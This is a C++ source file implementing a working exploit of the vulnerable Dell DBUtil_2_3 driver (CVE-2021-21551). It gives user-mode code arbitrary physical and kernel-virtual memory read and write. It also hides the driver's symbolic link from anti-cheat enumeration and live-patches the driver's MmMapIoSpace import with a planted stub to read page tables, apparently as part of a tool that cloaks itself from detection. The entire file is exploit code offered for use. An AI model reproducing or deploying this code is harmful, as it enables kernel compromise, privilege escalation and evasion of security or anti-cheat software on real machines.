#include "r0.hpp"
#include <windows.h>
#include <winternl.h>
#include "vmm.hpp"          // phys_is_ram guard for the MmMapIoSpace path
#include "cloak.hpp"        // loader-list locator, primary driver-base source
#include <cstring>
#include <cstdio>
#include <vector>

namespace r0 {

// DBUtil_2_3 (Dell BIOS flash utility driver, CVE-2021-21551).
//
// The IOCTL codes and request layouts below were read out of the shipped
// driver image by disassembling its IRP dispatch, not guessed.
//
//   0x9B0C1F40  physical read
//        request  { u64 header; u64 physaddr; u8 payload[]; }
//        length   0x10 + payload_size
//        the driver maps the range with MmMapIoSpace and copies it out.
//
//   0x9B0C1F44  physical write
//        request  { u64 header; u64 physaddr; u8 payload[]; }
//        length   0x10 + payload_size
//        copies the payload IN to the mapped physical range.
//
//   0x9B0C1EC4  kernel virtual read
//        request  { u64 header; u64 va; u64 offset; u8 payload[]; }
//        length   0x18 + payload_size
//
//   0x9B0C1EC8  kernel virtual write
//        request  { u64 header; u64 va; u64 offset; u8 payload[]; }
//        length   0x18 + payload_size
//        the target is va + offset (offset is read as a 32-bit value).
//
// The kernel-virtual path runs in the caller's thread context, so kernel
// addresses are valid there and the copy goes through the normal cached
// mapping. The physical path uses MmMapIoSpace(..., MmNonCached), whose
// writes bypass the cache and do NOT invalidate other cores' lines - so
// never use it to patch a structure the kernel is actively reading.
//
// The request's first 8 bytes must be zero (or match the cached value from
// the previous call), so the header stays zeroed.
//
// The other IOCTLs the driver exposes are port I/O (0x9B0C1EC0,
// 0x9B0C1F80..0x9B0C1F8C) and query handlers - none are needed here.

namespace {

constexpr DWORD kPhysRead  = 0x9B0C1F40;   // MmMapIoSpace + copy out
constexpr DWORD kPhysWrite = 0x9B0C1F44;   // MmMapIoSpace + copy in
constexpr DWORD kKernWrite = 0x9B0C1EC8;   // memmove to a kernel VA
constexpr DWORD kKernRead  = 0x9B0C1EC4;   // memmove from a kernel VA

constexpr size_t kPhysHdr = 0x10;          // { u64 hdr; u64 pa }
constexpr size_t kKernHdr = 0x18;          // { u64 hdr; u64 va; u64 off }

HANDLE g_dev = INVALID_HANDLE_VALUE;

// Set once the 0x9B0C1EC4 handler is proven to be the read half. Only used
// inside this translation unit, so it stays internal.
bool g_vread_ok = false;

// One attempt at the direction probe.
//
//   payload=false  header only (in 0x18, out 0x18+len). Harmless under BOTH
//                  readings: a read handler that sizes its copy from
//                  OutputBufferLength fills the buffer, a write handler has
//                  zero payload bytes to copy.
//   payload=true   in 0x18+len, out 0x18+len, payload zeroed. This is the
//                  shape a read handler that sizes its copy from
//                  InputBufferLength needs. Under the write reading it
//                  memmoves `len` zero bytes over the target.
//
// Returns 1 = MZ came back (read handler), 0 = no MZ, -1 = IOCTL failed.
// `zero_back` is set when the payload region came back all zeroes, i.e. our
// own zero payload was echoed unchanged - the transposed signature.
int try_vread(uint64_t va, size_t len, bool payload, bool& zero_back) {
    zero_back = false;
    std::vector<uint8_t> in(kKernHdr + (payload ? len : 0), 0);
    memcpy(in.data() + 0x08, &va, 8);

    std::vector<uint8_t> out(kKernHdr + len, 0xCC);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kKernRead, in.data(), (DWORD)in.size(),
                         out.data(), (DWORD)out.size(), &got, nullptr))
        return -1;

    static const uint8_t mz[2] = { 'M', 'Z' };
    if (len >= 2) {
        // Handlers either append past the header (the layout do_read and
        // do_vwrite use) or copy into the start of the shared buffer.
        if (memcmp(out.data() + kKernHdr, mz, 2) == 0) return 1;
        if (memcmp(out.data(), mz, 2) == 0) return 1;
    }

    if (payload) {
        bool z = true;
        for (size_t i = 0; i < len; ++i) if (out[kKernHdr + i]) { z = false; break; }
        zero_back = z;
    }
    return 0;
}

bool open_dev() {
    g_dev = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                        OPEN_EXISTING, 0, nullptr);
    if (g_dev != INVALID_HANDLE_VALUE) return true;

    // Symlink gizlendiğinde \\.\DBUtil_2_3 bulunamaz. NT yoluyla device
    // nesnesine direkt eriş: \Device\DBUtil_2_3.
    const wchar_t* p = L"\\Device\\DBUtil_2_3";
    UNICODE_STRING un{};
    un.Buffer = const_cast<PWSTR>(p);
    un.Length = un.MaximumLength = (USHORT)(wcslen(p) * sizeof(wchar_t));
    OBJECT_ATTRIBUTES oa{};
    InitializeObjectAttributes(&oa, &un, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
    IO_STATUS_BLOCK iosb{};
    using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
                                PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
    const auto nt = reinterpret_cast<Fn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateFile"));
    if (!nt) return false;
    HANDLE h = nullptr;
    if (nt(&h, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &oa, &iosb, nullptr, 0,
           FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, nullptr, 0) < 0) return false;
    g_dev = h;
    return true;
}

void close_dev() {
    if (g_dev != INVALID_HANDLE_VALUE) { CloseHandle(g_dev); g_dev = INVALID_HANDLE_VALUE; }
}

bool do_read(uint64_t pa, void* out, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    std::vector<uint8_t> buf(kPhysHdr + len, 0);
    memcpy(buf.data() + 0x08, &pa, 8);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kPhysRead, buf.data(), (DWORD)buf.size(),
                         buf.data(), (DWORD)buf.size(), &got, nullptr))
        return false;
    // `got` is not trusted: the dispatch may report the payload length, 0, or
    // the whole request depending on the branch. The content is validated by
    // the caller's non-zero probe, not by this count.
    memcpy(out, buf.data() + kPhysHdr, len);
    return true;
}

bool do_write(uint64_t pa, const void* in, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    std::vector<uint8_t> buf(kPhysHdr + len, 0);
    memcpy(buf.data() + 0x08, &pa, 8);
    memcpy(buf.data() + kPhysHdr, in, len);
    DWORD got = 0;
    return DeviceIoControl(g_dev, kPhysWrite, buf.data(), (DWORD)buf.size(),
                            buf.data(), (DWORD)buf.size(), &got, nullptr) != 0;
}

bool do_vread(uint64_t va, void* out, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    // Same guard as the write path: a non-canonical value sent to the kernel
    // handler would be dereferenced by memmove.
    if (va < 0xFFFF800000000000ull) return false;
    std::vector<uint8_t> buf(kKernHdr + len, 0);
    memcpy(buf.data() + 0x08, &va, 8);
    const uint64_t off = 0;
    memcpy(buf.data() + 0x10, &off, 8);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kKernRead, buf.data(), (DWORD)buf.size(),
                         buf.data(), (DWORD)buf.size(), &got, nullptr))
        return false;
    memcpy(out, buf.data() + kKernHdr, len);
    return true;
}

bool do_vwrite(uint64_t va, const void* in, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    // Only canonical kernel addresses. If the IOCTL table were ever transposed
    // again, the physical handler would treat this value as a physical address
    // and try to map it; refusing user-range values here keeps that from
    // becoming a mapping of an arbitrary PTE-derived address.
    if (va < 0xFFFF800000000000ull) return false;
    std::vector<uint8_t> buf(kKernHdr + len, 0);
    memcpy(buf.data() + 0x08, &va, 8);
    const uint64_t off = 0;
    memcpy(buf.data() + 0x10, &off, 8);
    memcpy(buf.data() + kKernHdr, in, len);
    DWORD got = 0;
    return DeviceIoControl(g_dev, kKernWrite, buf.data(), (DWORD)buf.size(),
                            buf.data(), (DWORD)buf.size(), &got, nullptr) != 0;
}

// Global backend pointer - initialised once by init().
// NOTE: starts as nullptr on purpose. If it pointed at the backend table
// from the start, init() would short-circuit on the `if (g_be)` check and
// never open the device, reporting success with no driver present.
Backend g_be_local{L"\\\\.\\DBUtil_2_3", open_dev, close_dev,
                   do_read, do_write, do_vwrite, do_vread};
const Backend* g_be = nullptr;

} // anonymous namespace

// ---------------------------------------------------------------------------
// Direction probe for the kernel-VA pair.
//
// The 0x9B0C1EC4 handler is documented as the read half, but that pair has
// never been exercised live, and a transposed pair would memmove zeroes over
// ntoskrnl's header. So the direction is proven before the path is used.
//
// Stage A carries the header only, which is harmless under either reading.
// Stage B carries a full-length zero payload, which a read handler that sizes
// from InputBufferLength needs - and which, if the handler turns out to be the
// write half, costs two bytes of ntoskrnl's "MZ". That is reported, and
// vmm::mz_ok() keeps every header-based path working for the rest of the boot.
//
// Deliberately no retry loop: both stages are idempotent and cheap.
// ---------------------------------------------------------------------------
bool vread_probe(uint64_t va, size_t len) {
    if (g_vread_ok) return true;
    if (g_dev == INVALID_HANDLE_VALUE || !len || len > 64) return false;
    if (va < 0xFFFF800000000000ull) return false;

    bool zb = false;

    // Stage A: header only. Nothing is written under either reading.
    if (try_vread(va, len, false, zb) == 1) { g_vread_ok = true; return true; }

    // Stage B: reached only when the handler ignored a zero-length payload,
    // i.e. it sizes the copy from InputBufferLength.
    if (try_vread(va, len, true, zb) == 1) { g_vread_ok = true; return true; }

    if (zb) {
        vmm::g_ntos_mz_broken = true;
        printf("[!] kernel-VA pair is TRANSPOSED: 0x%08X behaves as a write. "
               "ntoskrnl+0 now holds 00 00; header paths are degraded for this "
               "boot.\n", (unsigned)kKernRead);
    }
    return false;
}

bool vread_ready() { return g_vread_ok; }

// ---------------------------------------------------------------------------
// Public surface
// ---------------------------------------------------------------------------
bool init() {
    if (g_be) return true;
    if (!open_dev()) return false;

    // Prove the physical read path really reads.
    //
    // The failure this catches: if the two physical IOCTLs are transposed,
    // every "read" is a *write* of the zero-filled request buffer, and the
    // returned buffer stays zero. The previous version compared two such
    // buffers, found them equal, and printed "driver ok" while zeroing RAM.
    //
    // So read a handful of low physical addresses that carry non-zero
    // firmware data (BIOS data area at 0x400, its 640 KB memory-size word at
    // 0x413) and require at least one non-zero byte. Low memory is chosen
    // deliberately: if the table IS transposed, the only damage before we
    // bail is a few 8-byte zeroes in reserved low RAM, not an 8-million-page
    // CR3 scan.
    //
    // There is intentionally NO physical write probe here. The write paths are
    // exercised by --kwtest and the cloak, both of which are opt-in.
    static const uint64_t kProbePa[] = { 0x400, 0x410, 0x420, 0x1000, 0x2000 };
    bool any = false;
    for (uint64_t pa : kProbePa) {
        uint8_t b[16]{};
        if (!do_read(pa, b, sizeof(b))) {
            printf("[!] physical read failed at 0x%llx (IOCTL 0x%08X)\n",
                   (unsigned long long)pa, (unsigned)kPhysRead);
            close_dev();
            return false;
        }
        for (uint8_t v : b) any |= (v != 0);
        if (any) break;
    }
    if (!any) {
        printf("[!] physical reads returned all zeros - IOCTL pair swapped?\n");
        close_dev();
        return false;
    }

    g_be = &g_be_local;
    return true;
}

void shutdown() {
    if (g_be) { g_be->close(); g_be = nullptr; }
}

bool alive() { return g_be != nullptr; }

void set_backend(const Backend* be) { g_be = be; }

// Physical reads. 2026-11-17: the kernel direct map (0xFFFF800000000000 + pa)
// is NOT a valid read path on build 26200 - the System DTB page (pa 0x1ae000)
// faulted at 0xffff8000001ae000 through the driver's SEH-less read loop
// (0x50). MmGetVirtualForPhysical on this build consults the PFN entry's
// PteAddress instead of a flat base, so there is no fixed direct-map address
// for arbitrary RAM. Physical reads therefore go ONLY through the driver's
// MmMapIoSpace IOCTL: the driver refuses unmappable ranges with a NULL
// mapping instead of faulting, so a wrong address costs a failed read, never
// a bugcheck. The RAM-range guard additionally keeps the walk out of MMIO
// holes, where the copy would return garbage or hang on a powered-down BAR.
bool pread(uint64_t pa, void* buf, size_t len) {
    if (!g_be) return false;
    if (!len) return true;
    if (!vmm::phys_is_ram(pa, len)) return false;
    return g_be->read(pa, buf, len);
}

bool pwrite(uint64_t pa, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->write(pa, buf, len);
}

bool vwrite(uint64_t va, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vwrite(va, buf, len);
}

bool vread(uint64_t va, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vread(va, buf, len);
}

// ---------------------------------------------------------------------------
// \??\DBUtil_2_3 removal.
//
// DriverEntry creates \Device\DBUtil_2_3 and the symbolic link \??\DBUtil_2_3
// (shown as \DosDevices\DBUtil_2_3). The link is what makes
// CreateFile("\\.\DBUtil_2_3") work, and it is also a name an anti-cheat can
// enumerate. IoCreateSymbolicLink creates the link as a permanent object, so
// the way to remove the name is:
//
//   1. open the link with DELETE access,
//   2. NtMakeTemporaryObject clears OBJ_PERMANENT,
//   3. close the handle - the object directory entry goes away.
//
// The device object is not touched. Our already-open handle refers to it
// directly, so I/O through it keeps working; a later process opening by path
// gets OBJECT_NAME_NOT_FOUND. \Driver\DBUtil_2_3 and the service registry key
// survive this - they need object-directory surgery, not a link removal.
// ---------------------------------------------------------------------------
using NtOpenSymbolicLinkObjectFn =
    NTSTATUS (NTAPI*)(HANDLE*, ACCESS_MASK, PUNICODE_STRING);
using NtMakeTemporaryObjectFn = NTSTATUS (NTAPI*)(HANDLE);

bool hide_symlink(const wchar_t* link) {
    if (!link || !*link) return false;

    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) return false;
    const auto nt_open = reinterpret_cast<NtOpenSymbolicLinkObjectFn>(
        reinterpret_cast<void*>(GetProcAddress(nt, "NtOpenSymbolicLinkObject")));
    const auto nt_temp = reinterpret_cast<NtMakeTemporaryObjectFn>(
        reinterpret_cast<void*>(GetProcAddress(nt, "NtMakeTemporaryObject")));
    if (!nt_open || !nt_temp) {
        printf("[!] ntdll is missing NtOpenSymbolicLinkObject / "
               "NtMakeTemporaryObject\n");
        return false;
    }

    UNICODE_STRING name{};
    name.Buffer = const_cast<PWSTR>(link);
    name.Length = static_cast<USHORT>(wcslen(link) * sizeof(wchar_t));
    name.MaximumLength = name.Length;

    HANDLE h = nullptr;
    NTSTATUS st = nt_open(&h, DELETE, &name);
    if (st < 0) {
        printf("[!] open %ls failed: 0x%08lX - DELETE access refused?\n",
               link, static_cast<unsigned long>(st));
        return false;
    }

    st = nt_temp(h);
    CloseHandle(h);                 // deletion happens when the last handle closes
    if (st < 0) {
        printf("[!] NtMakeTemporaryObject failed: 0x%08lX\n",
               static_cast<unsigned long>(st));
        return false;
    }

    // Prove the name is gone. The device is exclusive and already open by us,
    // so "still there" would surface as a sharing/access error, not a success;
    // only not-found means the link was actually removed.
    HANDLE probe = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                               OPEN_EXISTING, 0, nullptr);
    if (probe != INVALID_HANDLE_VALUE) {
        CloseHandle(probe);
        printf("[!] \\\\.\\DBUtil_2_3 still opens - the link was not removed\n");
        return false;
    }
    const DWORD err = GetLastError();
    if (err != ERROR_FILE_NOT_FOUND && err != ERROR_PATH_NOT_FOUND) {
        printf("[!] \\\\.\\DBUtil_2_3 still resolves (error %lu) - "
               "the link was not removed\n", err);
        return false;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Cached physical mapping patch (--dpatch).
//
// The shipped driver calls MmMapIoSpace(pa, len, MmNonCached). On this build
// the kernel refuses MmNonCached mappings of pages that are in use as OS RAM
// (the cache-attribute conflict check inside MmMapIoSpaceEx) - which is every
// page-table page and every game structure. Only firmware-reserved low pages
// (below the first managed page, ~0x1ae000 on this machine) map. That is why
// every page-table walk died with "physical read refused" while --raw 0x400
// "worked": the reads that failed were exactly the reads of real RAM.
//
// The fix is applied live through the proven kernel-VA write. The driver's
// import slot for MmMapIoSpace (RVA 0x12048) is redirected to an 18-byte
// stub planted in the driver's own int3 padding (RVA 0x1161e, .text, which
// is MEM_NOT_PAGED so the stub can never be paged out):
//
//   41 b8 01 00 00 00     mov  $1,%r8d        ; CacheType = MmCached
//   48 b8 <real>          movabs $real,%rax   ; real = ntos!MmMapIoSpace
//   ff e0                 jmp  %rax
//
// Reading RAM through a cached mapping is correct: the CPU keeps cached
// mappings coherent, and the kernel itself writes page tables through
// cached mappings. MMIO is never touched by this tool. Every byte written
// is verified first (padding must be pure int3, the import slot must hold
// exactly ntos!MmMapIoSpace, and the bytes at that address must match the
// shipped MmMapIoSpace prologue). If HVCI is running, kernel code pages are
// read-only and a write there bugchecks - so the patch refuses outright
// instead. The patch lives only in memory: re-run --dpatch after every
// boot, BEFORE --cloak (it needs the driver still in the module list).
// ---------------------------------------------------------------------------
namespace {

using NtQuerySystemInformationFn = NTSTATUS (NTAPI*)(ULONG, PVOID, ULONG, PULONG);

NtQuerySystemInformationFn get_query_system_info() {
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) return nullptr;
    return reinterpret_cast<NtQuerySystemInformationFn>(
        reinterpret_cast<void*>(GetProcAddress(nt, "NtQuerySystemInformation")));
}

#pragma pack(push, 8)
struct RtlProcessModuleInfo {
    void*     Section;
    void*     MappedBase;
    void*     ImageBase;
    uint32_t  ImageSize;
    uint32_t  Flags;
    uint16_t  LoadCount;
    uint16_t  OffsetToFileName;
    char      FullPathName[256];
};
#pragma pack(pop)

bool hvci_running() {
    const auto qs = get_query_system_info();
    if (!qs) return true;   // cannot check - refuse on the safe side
    struct { ULONG length; ULONG options; } ci{ 8, 0 };
    ULONG ret = 0;
    // SystemCodeIntegrityInformation = 103; option bit 0x2 = HVCI enabled.
    if (qs(103, &ci, sizeof(ci), &ret) < 0) return true;
    return (ci.options & 0x2) != 0;
}

bool find_driver_base(uint64_t& base, uint32_t& size) {
    const auto qs = get_query_system_info();
    if (!qs) {
        printf("[-] fallback: NtQuerySystemInformation not resolvable\n");
        return false;
    }
    std::vector<uint8_t> buf(1u << 21);
    NTSTATUS st = 0;
    // SystemModuleInformation = 11. Grow once if the caller-reported size is
    // bigger than the first guess.
    for (int attempt = 0; attempt < 4; ++attempt) {
        ULONG need = 0;
        st = qs(11, buf.data(), static_cast<ULONG>(buf.size()), &need);
        if (st >= 0) break;
        if (!need || need > (1u << 24)) {
            printf("[-] fallback: module query failed, status 0x%08lx\n",
                   static_cast<unsigned long>(st));
            return false;
        }
        buf.resize(static_cast<size_t>(need) + 0x1000);
    }
    if (st < 0) {
        printf("[-] fallback: module query failed, status 0x%08lx\n",
               static_cast<unsigned long>(st));
        return false;
    }
    if (buf.size() < 8) return false;
    const uint32_t count = *reinterpret_cast<uint32_t*>(buf.data());
    if (count > 4096) {
        printf("[-] fallback: implausible module count %u\n", count);
        return false;
    }
    const auto* mods = reinterpret_cast<const RtlProcessModuleInfo*>(buf.data() + 8);
    for (uint32_t i = 0; i < count; ++i) {
        const RtlProcessModuleInfo& m = mods[i];
        char lower[256]{};
        const size_t n = strnlen(m.FullPathName, sizeof(m.FullPathName));
        for (size_t k = 0; k < n && k < sizeof(lower) - 1; ++k)
            lower[k] = (m.FullPathName[k] >= 'A' && m.FullPathName[k] <= 'Z')
                       ? static_cast<char>(m.FullPathName[k] + 32)
                       : m.FullPathName[k];
        if (!strstr(lower, "dbutil_2_3")) continue;
        base = reinterpret_cast<uint64_t>(m.ImageBase);
        size = m.ImageSize;
        return true;
    }
    printf("[-] fallback: %u module(s) queried, none named dbutil_2_3\n", count);
    printf("[*] fallback: first 0x80 bytes of the module buffer:\n    ");
    for (size_t i = 0; i < 0x80 && i < buf.size(); ++i)
        printf("%02x%s", buf[i], (i % 16 == 15) ? "\n    " : " ");
    printf("\n[-] fallback: first entries as parsed (stride 296):\n");
    for (uint32_t i = 0; i < count && i < 6; ++i)
        printf("    [%u] base 0x%llx size 0x%x '%s'\n", i,
               (unsigned long long)reinterpret_cast<uintptr_t>(mods[i].ImageBase),
               mods[i].ImageSize, mods[i].FullPathName);
    return false;
}

} // anonymous namespace

bool patch_cached_map() {
    if (hvci_running()) {
        printf("[!] HVCI is running - kernel code pages are read-only and the\n"
               "    cached-map patch would bugcheck. The patch is refused.\n");
        return false;
    }

    if (!vmm::g_ntos) {
        printf("[!] ntoskrnl base unknown\n");
        return false;
    }

    // ntos!MmMapIoSpace (RVA taken from the shipped ntoskrnl.exe of this
    // build; the prologue check below proves the RVA before anything is
    // written).
    const uint64_t real_map = vmm::g_ntos + 0x487ab0ull;
    static const uint8_t kMmMapIoSpaceHead[16] = {
        0x48, 0x83, 0xEC, 0x28, 0x41, 0x0F, 0xB6, 0xC0,
        0x83, 0xF8, 0x06, 0x73, 0x2B, 0x41, 0xB8, 0x40 };
    uint8_t head[16]{};
    if (!vread(real_map, head, sizeof(head))) {
        printf("[!] cannot read ntos!MmMapIoSpace at 0x%llx\n",
               (unsigned long long)real_map);
        return false;
    }
    if (memcmp(head, kMmMapIoSpaceHead, sizeof(head)) != 0) {
        printf("[!] bytes at ntos+0x487ab0 are not MmMapIoSpace - not patching\n");
        return false;
    }

    uint64_t drv{};
    uint32_t drv_size{};
    // Primary: the proven loader-list walk (same locator --cloak uses).
    // Fallback: NtQuerySystemInformation with full diagnostics.
    bool have = cloak::module_base(drv, drv_size);
    if (!have) {
        printf("[*] loader-list locator failed - trying the module query\n");
        have = find_driver_base(drv, drv_size);
    }
    if (!have) {
        printf("[!] DBUtil_2_3 module not located\n");
        printf("    either the driver is not loaded (sc start DBUtil_2_3) or\n"
               "    it is already cloaked this boot: reboot, load the driver,\n"
               "    then run --dpatch BEFORE --cloak\n");
        return false;
    }
    printf("[+] driver module base 0x%llx size 0x%x\n",
           (unsigned long long)drv, drv_size);

    // Layout facts from disassembling the shipped image:
    //   0x12048  import slot for MmMapIoSpace (shared by read and write)
    //   0x15165  xor %r8d,%r8d  -> CacheType = MmNonCached before the call
    //   0x1161e  18 bytes of int3 padding in .text - room for the stub
    const uint64_t kImport = drv + 0x12048ull;
    const uint64_t kPad    = drv + 0x1161eull;
    const uint64_t stub    = kPad;

    uint64_t imp{};
    if (!vread(kImport, &imp, 8)) {
        printf("[!] cannot read the import slot\n");
        return false;
    }
    if (imp == stub) {
        printf("[*] import already points at the cached-map stub\n");
    } else {
        if (imp != real_map) {
            printf("[!] import slot holds 0x%llx, expected ntos!MmMapIoSpace "
                   "0x%llx - not patching\n",
                   (unsigned long long)imp, (unsigned long long)real_map);
            return false;
        }

        uint8_t kStub[18] = {
            0x41, 0xB8, 0x01, 0x00, 0x00, 0x00,          // mov $1,%r8d (MmCached)
            0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,          // movabs $real,%rax
            0xFF, 0xE0 };                                // jmp %rax
        const uint64_t t = real_map;
        memcpy(kStub + 8, &t, 8);

        uint8_t pad[18]{};
        if (!vread(kPad, pad, sizeof(pad))) {
            printf("[!] cannot read the stub slot\n");
            return false;
        }
        if (memcmp(pad, kStub, 6) != 0) {
            for (uint8_t b : pad) {
                if (b != 0xCC) {
                    printf("[!] stub slot 0x%llx is not int3 padding "
                           "(found 0x%02x) - not patching\n",
                           (unsigned long long)kPad, b);
                    return false;
                }
            }
            if (!vwrite(kPad, kStub, sizeof(kStub))) {
                printf("[!] stub write failed\n");
                return false;
            }
            uint8_t chk[18]{};
            if (!vread(kPad, chk, sizeof(chk)) ||
                memcmp(chk, kStub, sizeof(chk)) != 0) {
                printf("[!] stub read-back mismatch\n");
                return false;
            }
            printf("[+] cached-map stub planted at 0x%llx\n",
                   (unsigned long long)kPad);
        }

        if (!vwrite(kImport, &stub, 8)) {
            printf("[!] import pointer write failed\n");
            return false;
        }
        uint64_t chk2{};
        if (!vread(kImport, &chk2, 8) || chk2 != stub) {
            printf("[!] import read-back mismatch\n");
            return false;
        }
        printf("[+] MmMapIoSpace import redirected to the stub (MmCached)\n");
    }

    // Prove it: the two addresses that refused before, plus a known-good one.
    struct T { uint64_t pa; const char* tag; };
    const T tests[] = {
        { 0x1ae000, "System PML4, refused before" },
        { 0x200000, "RAM, refused before" },
        { 0x400,    "firmware BDA, worked before" },
    };
    for (const T& tc : tests) {
        uint8_t b[16]{};
        const bool ok = pread(tc.pa, b, sizeof(b));
        printf("[*] phys read 0x%llx (%s): %s  %02x %02x %02x %02x %02x %02x %02x %02x\n",
               (unsigned long long)tc.pa, tc.tag, ok ? "OK" : "FAIL",
               b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
    }
    printf("[*] patch is memory-only: re-run --dpatch on every boot\n");
    return true;
}

} // namespace r0